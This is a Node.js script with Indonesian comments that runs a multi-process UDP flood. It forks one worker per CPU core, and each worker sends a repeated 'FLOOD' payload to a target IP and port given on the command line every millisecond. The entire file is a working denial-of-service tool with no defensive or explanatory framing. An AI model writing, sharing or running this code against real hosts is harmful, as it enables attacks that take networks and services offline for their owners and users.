const dgram = require('dgram');
const cluster = require('cluster');
const os = require('os');
const numCPUs = os.cpus().length || 4;  // Default 4 CPU jika gagal mendeteksi

if (cluster.isMaster) {
    // Fork workers sesuai jumlah CPU yang ada
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    console.log(`Memulai UDP flood dengan ${numCPUs} threads...`);
} else {
    const client = dgram.createSocket('udp4');
    const IP_TARGET = process.argv[2];
    const PORT_TARGET = parseInt(process.argv[3]);

    if (!IP_TARGET || !PORT_TARGET) {
        console.error('Contoh penggunaan: node udp {ip} {port}');
        process.exit(1);
    }

    const payload = Buffer.from('FLOOD'.repeat(1024)); // Mengirim paket 'FLOOD' berulang kali

    function startFlood() {
        // Mengirim paket setiap 1 ms
        setInterval(() => {
            client.send(payload, PORT_TARGET, IP_TARGET, (err) => {
                if (err) {
                    console.error('Gagal mengirim paket:', err);
                }
            });
        }, 1); // Interval pengiriman setiap 1ms
    }

    startFlood();
}
